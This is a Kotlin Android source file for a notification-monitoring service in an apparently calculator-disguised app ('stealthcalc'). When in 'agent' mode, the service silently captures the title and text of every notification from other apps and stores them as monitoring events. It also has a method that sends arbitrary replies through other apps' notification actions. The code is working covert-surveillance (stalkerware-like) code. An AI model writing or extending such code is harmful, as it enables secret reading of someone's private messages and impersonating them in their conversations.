package com.stealthcalc.monitoring.service

import android.app.Notification
import android.app.PendingIntent
import android.app.RemoteInput as AndroidRemoteInput
import android.content.Intent
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.MonitoringEventKind
import com.stealthcalc.monitoring.model.NotificationPayload
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject

@AndroidEntryPoint
class NotificationMonitorService : NotificationListenerService() {

    @Inject lateinit var repository: MonitoringRepository

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (!repository.isAgent) return
        if (!repository.isMetricEnabled("notifications")) return
        if (sbn.packageName == packageName) return

        val extras = sbn.notification.extras
        val title = extras.getCharSequence("android.title")?.toString()
        val text = extras.getCharSequence("android.text")?.toString()
        val category = sbn.notification.category

        val appName = runCatching {
            packageManager.getApplicationLabel(
                packageManager.getApplicationInfo(sbn.packageName, 0)
            ).toString()
        }.getOrNull()

        scope.launch {
            runCatching {
                val payload = Json.encodeToString(
                    NotificationPayload(
                        packageName = sbn.packageName,
                        appName = appName,
                        title = title,
                        text = text,
                        category = category,
                        postedAt = sbn.postTime,
                    )
                )
                repository.recordEvent(MonitoringEventKind.NOTIFICATION, payload)
            }.onFailure { e ->
                AppLogger.log(this@NotificationMonitorService, "[agent]", "Notification capture error: ${e.message}")
            }
        }
    }

    fun replyToNotification(packageName: String, replyText: String): Boolean {
        val notifications = activeNotifications ?: return false
        for (sbn in notifications) {
            if (sbn.packageName != packageName) continue
            val actions = sbn.notification.actions ?: continue
            for (action in actions) {
                val remoteInputs = action.remoteInputs ?: continue
                if (remoteInputs.isEmpty()) continue

                val intent = Intent()
                val bundle = Bundle()
                for (ri in remoteInputs) {
                    bundle.putCharSequence(ri.resultKey, replyText)
                }
                AndroidRemoteInput.addResultsToIntent(remoteInputs, intent, bundle)

                runCatching {
                    action.actionIntent.send(this, 0, intent)
                    AppLogger.log(this, "[agent]", "Replied to $packageName: ${replyText.take(20)}...")
                    return true
                }
            }
        }
        return false
    }

    companion object {
        var instance: NotificationMonitorService? = null
            private set
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
    }

    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }
}
